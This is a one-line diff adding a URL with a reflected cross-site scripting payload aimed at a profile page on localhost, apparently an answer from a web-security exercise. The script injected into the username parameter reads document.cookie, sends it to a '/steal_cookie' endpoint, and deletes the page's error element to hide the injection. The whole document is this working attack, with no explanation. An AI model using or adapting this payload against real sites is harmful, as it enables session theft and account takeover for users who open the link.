@@ -1,0 +1,1 @@
+http://localhost:3000/profile?username=user0<script>fetch(`http://localhost:3000/steal_cookie?cookie=${document.cookie}`);document.getElementsByClassName("error")[0].remove();</script>
